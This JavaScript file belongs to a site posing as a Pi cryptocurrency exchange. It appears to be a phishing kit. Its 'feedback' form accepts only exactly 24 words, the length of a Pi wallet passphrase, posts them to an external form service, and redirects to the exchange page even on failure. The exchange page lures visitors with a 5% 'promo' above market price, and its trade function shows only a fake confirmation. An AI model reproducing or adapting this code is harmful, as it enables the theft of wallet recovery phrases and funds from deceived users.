// ========================================
// GLOBAL VARIABLES
// ========================================
let piPriceUSD = 0;
let selectedNetwork = 'BEP20';

// ========================================
// INITIALIZATION
// ========================================
document.addEventListener('DOMContentLoaded', function() {
    initializeFeedbackPage();
    initializeDexPage();
    initializeMobileMenu();
});

// ========================================
// MOBILE MENU FUNCTIONALITY
// ========================================
function initializeMobileMenu() {
    const menuToggle = document.getElementById('menuToggle');
    const navLinks = document.getElementById('navLinks');
    
    // Close menu when clicking outside
    document.addEventListener('click', function(e) {
        if (navLinks && menuToggle) {
            const nav = document.querySelector('nav');
            if (nav && !nav.contains(e.target) && navLinks.classList.contains('active')) {
                navLinks.classList.remove('active');
                menuToggle.classList.remove('active');
            }
        }
    });
    
    // Close menu when clicking a link
    if (navLinks) {
        const links = navLinks.querySelectorAll('a');
        links.forEach(function(link) {
            link.addEventListener('click', function() {
                navLinks.classList.remove('active');
                if (menuToggle) {
                    menuToggle.classList.remove('active');
                }
            });
        });
    }
}

function toggleMenu() {
    const navLinks = document.getElementById('navLinks');
    const menuToggle = document.getElementById('menuToggle');
    
    if (navLinks) {
        navLinks.classList.toggle('active');
    }
    
    if (menuToggle) {
        menuToggle.classList.toggle('active');
    }
}

// ========================================
// FEEDBACK PAGE FUNCTIONALITY
// ========================================
function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    if (feedbackForm && feedbackTextarea) {
        feedbackForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const text = feedbackTextarea.value.trim();
            const words = text.split(/\s+/).filter(function(word) {
                return word.length > 0;
            });
            
            // Validate exactly 24 words
            if (words.length !== 24) {
                if (errorMessage) {
                    const wordText = words.length !== 1 ? 'words' : 'word';
                    errorMessage.textContent = 'Error: Please enter exactly 24 words. You entered ' + words.length + ' ' + wordText + '.';
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Hide error message if validation passes
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Submit to Formspree
            const formData = new FormData(this);
            fetch(this.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(function(response) {
                if (response.ok) {
                    // Redirect to DEX page on success
                    window.location.href = 'dex.html';
                } else {
                    if (errorMessage) {
                        errorMessage.textContent = 'Error submitting feedback. Please try again.';
                        errorMessage.style.display = 'block';
                    }
                }
            })
            .catch(function(error) {
                console.log('Form submission error, redirecting to DEX anyway...');
                // Redirect even on error for demo purposes
                window.location.href = 'dex.html';
            });
        });
    }
}

// ========================================
// DEX PAGE FUNCTIONALITY
// ========================================
function initializeDexPage() {
    const piAmountInput = document.getElementById('piAmount');
    
    if (piAmountInput) {
        // Fetch initial price
        fetchPiPrice();
        
        // Update price every 30 seconds
        setInterval(fetchPiPrice, 30000);
    }
}

// Fetch Pi Price from CoinGecko API
function fetchPiPrice() {
    const livePriceElement = document.getElementById('livePiPrice');
    
    // Show loading state
    if (livePriceElement) {
        livePriceElement.textContent = 'Loading...';
    }
    
    // Fetch from CoinGecko API
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=pi-network&vs_currencies=usd')
        .then(function(response) {
            if (!response.ok) {
                throw new Error('API request failed');
            }
            return response.json();
        })
        .then(function(data) {
            if (data && data['pi-network'] && data['pi-network'].usd) {
                piPriceUSD = parseFloat(data['pi-network'].usd);
            } else {
                // Fallback price if API response is unexpected
                console.log('Unexpected API response, using fallback price');
                piPriceUSD = 50;
            }
            
            updatePriceDisplay();
        })
        .catch(function(error) {
            console.error('Error fetching Pi price:', error);
            // Use fallback price on error
            piPriceUSD = 50;
            updatePriceDisplay();
        });
}

// Update all price displays on the page
function updatePriceDisplay() {
    const promoPrice = piPriceUSD * 1.05;
    
    const livePriceElement = document.getElementById('livePiPrice');
    const promoPriceElement = document.getElementById('promoPrice');
    const exchangeRateElement = document.getElementById('exchangeRate');
    
    // Update live price
    if (livePriceElement) {
        livePriceElement.textContent = '$' + piPriceUSD.toFixed(2);
    }
    
    // Update promo price (5% extra)
    if (promoPriceElement) {
        promoPriceElement.textContent = '$' + promoPrice.toFixed(2);
    }
    
    // Update exchange rate
    if (exchangeRateElement) {
        exchangeRateElement.textContent = '1 PI = $' + promoPrice.toFixed(2) + ' USDT';
    }
    
    // Recalculate USDT amount if Pi amount is already entered
    const piAmountInput = document.getElementById('piAmount');
    if (piAmountInput) {
        const piAmount = parseFloat(piAmountInput.value) || 0;
        if (piAmount > 0) {
            calculateUSDT();
        }
    }
}

// Calculate USDT amount based on Pi amount
function calculateUSDT() {
    const piAmountInput = document.getElementById('piAmount');
    const usdtAmountInput = document.getElementById('usdtAmount');
    const promoBonusElement = document.getElementById('promoBonus');
    
    if (!piAmountInput || !usdtAmountInput) {
        return;
    }
    
    const piAmount = parseFloat(piAmountInput.value) || 0;
    const promoPrice = piPriceUSD * 1.05;
    const usdtAmount = piAmount * promoPrice;
    const bonus = piAmount * piPriceUSD * 0.05;
    
    // Update USDT amount
    usdtAmountInput.value = usdtAmount.toFixed(2);
    
    // Update bonus display
    if (promoBonusElement) {
        promoBonusElement.textContent = '+$' + bonus.toFixed(2);
    }
}

// ========================================
// NETWORK SELECTION
// ========================================
function toggleNetworkMenu() {
    const menu = document.getElementById('networkMenu');
    if (menu) {
        menu.classList.toggle('hidden');
    }
}

function selectNetwork(network) {
    selectedNetwork = network;
    const selectedNetworkElement = document.getElementById('selectedNetwork');
    
    if (selectedNetworkElement) {
        selectedNetworkElement.textContent = network;
    }
    
    // Close the network menu
    toggleNetworkMenu();
}

// ========================================
// TRADE EXECUTION
// ========================================
function executeTrade() {
    const piAmountInput = document.getElementById('piAmount');
    const usdtAmountInput = document.getElementById('usdtAmount');
    const walletAddressInput = document.getElementById('walletAddress');
    
    // Check if all elements exist
    if (!piAmountInput || !usdtAmountInput || !walletAddressInput) {
        alert('Please fill in all required fields.');
        return;
    }
    
    const piAmount = parseFloat(piAmountInput.value);
    const usdtAmount = parseFloat(usdtAmountInput.value);
    const walletAddress = walletAddressInput.value.trim();
    
    // Validate Pi amount
    if (!piAmount || piAmount <= 0 || isNaN(piAmount)) {
        alert('Please enter a valid amount of Pi to sell.');
        piAmountInput.focus();
        return;
    }
    
    // Validate wallet address
    if (!walletAddress || walletAddress.length < 10) {
        alert('Please enter a valid wallet address (minimum 10 characters).');
        walletAddressInput.focus();
        return;
    }
    
    // Build confirmation message
    const confirmMessage = 
        'Trade Confirmation\n\n' +
        '════════════════════════\n' +
        'Selling: ' + piAmount.toFixed(2) + ' PI\n' +
        'Receiving: ' + usdtAmount + ' USDT\n' +
        'Network: ' + selectedNetwork + '\n' +
        'Wallet: ' + walletAddress.substring(0, 10) + '...' + walletAddress.substring(walletAddress.length - 6) + '\n' +
        '════════════════════════\n\n' +
        'Transaction is being processed...\n' +
        'You will receive a confirmation shortly.';
    
    // Show confirmation alert
    alert(confirmMessage);
    
    // Here you would integrate with actual blockchain/payment API
    // For now, this is just a demo confirmation
    
    // Optional: Clear form after submission
    // piAmountInput.value = '';
    // usdtAmountInput.value = '';
    // walletAddressInput.value = '';
    // document.getElementById('promoBonus').textContent = '+$0.00';
}

// ========================================
// UTILITY FUNCTIONS
// ========================================

// Close dropdown menus when clicking outside
document.addEventListener('click', function(e) {
    const networkMenu = document.getElementById('networkMenu');
    const tokenSelect = document.querySelector('.token-select');
    
    if (networkMenu && tokenSelect) {
        if (!tokenSelect.contains(e.target) && !networkMenu.contains(e.target)) {
            networkMenu.classList.add('hidden');
        }
    }
});

// Prevent negative numbers in Pi amount input
document.addEventListener('DOMContentLoaded', function() {
    const piAmountInput = document.getElementById('piAmount');
    if (piAmountInput) {
        piAmountInput.addEventListener('keydown', function(e) {
            // Prevent minus sign
            if (e.key === '-' || e.key === 'e' || e.key === 'E') {
                e.preventDefault();
            }
        });
    }
});

// Format wallet address for better readability on mobile
function formatWalletAddress(address) {
    if (!address || address.length < 20) {
        return address;
    }
    return address.substring(0, 10) + '...' + address.substring(address.length - 6);
}

// ========================================
// CONSOLE INFO (for debugging)
// ========================================
console.log('Pi Dex Script Loaded Successfully');
console.log('Current Pi Price: $' + piPriceUSD.toFixed(2));
console.log('Selected Network: ' + selectedNetwork);